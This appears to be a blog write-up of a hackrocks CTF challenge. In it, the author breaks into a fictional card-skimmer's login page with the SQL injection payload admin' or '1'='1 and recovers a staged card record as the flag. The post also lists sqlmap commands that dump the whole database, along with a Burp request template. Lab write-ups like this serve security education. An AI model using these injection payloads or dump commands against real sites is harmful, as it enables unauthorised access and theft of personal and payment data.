+++
title = "🤖 [0x01] Atacant el Dolent"
description = "Writeup for 'Atacant el Dolent'"
date = "2022-06-14"
aliases = ["writeup", "writeups", "ctf", "ctfs"]
author = "cakehonolulu"
+++
<br>

![Atacant el Dolent](/images/ctfs/nuclio_cyberhack/atacant-el-dolent/atacant-el-dolent.jpg)

<table>
<thead>
  <tr>
    <th>Difficulty</th>
    <td>Medium</td>
  </tr>
</thead>
<tbody>
  <tr>
    <th>Points</th>
    <td>70</td>
  </tr>
  <tr>
    <th>Category</th>
    <td>Software security</td>
  </tr>
</tbody>
</table>

# Description
<br>
<img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/openmoji/292/flag-for-catalonia-esct_1f3f4-e0065-e0073-e0063-e0074-e007f.png" width="20px" height="20px" style="vertical-align: bottom;"> En els darrers dies s'han rebut tiquets dels nostres clients notificant i reclamant diners per compres que no han fet.

Tots ells accepten que aquests càrrecs es fan després d'haver realitzat una compra a la nostra botiga col·laboradora.

Després d'aquest estrany incident, truquem al nostre Equip Blau per investigar el cas. Després de revisar tant els registres com el codi web, van aconseguir trobar una biblioteca de tercers que va capturar la informació de les targetes bancàries, així com el seu CVV i data de venciment.

Addicionalment, analitzant aquesta biblioteca troben el lloc web on s'enviaven les dades, però troben un login i aquest equip no està especialitzat en atacs d'aquest estil, per la qual cosa sol·liciten la teva ajuda, perquè investiguis aquest lloc web, obtinguis accés i verificar si les dades emmagatzemades són allà, i més específicament, les dades d'Adrián Peréz Ríos, ja que és un client important.

<hr>

El token del joc serà: contrasenyaadmin-numtargeta-cvv-datacaducitat d'Adrián Pérez Ríos ó 0000000000-123-12/22 en cas de que no estigui.

Exemple de resposta: admin12-4548812049400004-203-08/27

Per accedir al repte, fes clic al següent link: https://challenges.hackrocks.com/bad-guy 
<br>
<br>
🇺🇸 We've been bombarded by our clients regarding credit card uses that were not made by them.

All of them agree that those uses were done right after buying through one of our partner's shops.

After the incident, our Blue Team started to study the infraestructure of the website and found a third-party library that was capturing our clients credit card details.

Additionally, the Blue Team found a website that contains a login form; but they're not talented enough to gain access so they come asking for your help.
Carefully check if there's our clients CC info there and check if there's Adrián Pérez Ríos specifically, he's a very important client.

<hr>

Game token is: adminpassword-ccnumber-cvv-expirydate from Adrián Pérez Ríos or 0000000000-123-12/22 by default.

Token example: admin12-4548812049400004-203-08/27

To access the challenge, enter here: https://challenges.hackrocks.com/bad-guy 
<br>

<h1>Solution walkthrough</h1>
<br>

We start by accessing the [provided link](https://challenges.hackrocks.com/bad-guy) and  we're greeted with this:

![Login Page](/images/ctfs/nuclio_cyberhack/atacant-el-dolent/login_page.png)

You can try the default creds (admin:admin... and such) but they won't work.

The exploit itself is very easy; a simple SQL injection.

<code>admin' or '1'='1</code> on the user and passwords fields and...

![Access](/images/ctfs/nuclio_cyberhack/atacant-el-dolent/access.png)

_Voilá!_

You need to click on a button with an '?' to view the credentials, and those are:

User: <code>admin</code>
<br>
Password: <code>123456789987654321</code>

We can now access the default url and check those, we try them and we're met with this:

![Solution](/images/ctfs/nuclio_cyberhack/atacant-el-dolent/solution.png)

Where we can see the user they asked us to look for.

Flag: <code>123456789987654321-6269784865499645-879-07/25</code>

_NOTE:_

I also ran an SQLMap through the login request (Saved using BURP) and dumped the entire database.

Out of curiosity, there's another user that can enter the page:

User: <code>usu</code>
Password: <code>1234678</code>

Commands:

{{< highlight bash >}}
$ sqlmap -r request.txt -p password --level 5 --risk 3
{{< /highlight >}}

and for dumping:

{{< highlight bash >}}
$ sqlmap -r request.txt -p password --level 5 --risk 3 --all
{{< /highlight >}}

Saved request with BURP:

{{< highlight bash >}}
GET /bad-guy/?username=admin&password=admin&login=Are+you+sure%3F HTTP/1.1
Host: challenges.hackrocks.com
Cookie: darkmode=true; refresh=${YOUR_COOKIE}; PHPSESSID=${YOUR_PHPSESSID}; access=${YOUR_ACCESS}
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://challenges.hackrocks.com/bad-guy/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers
Connection: close
{{< /highlight >}}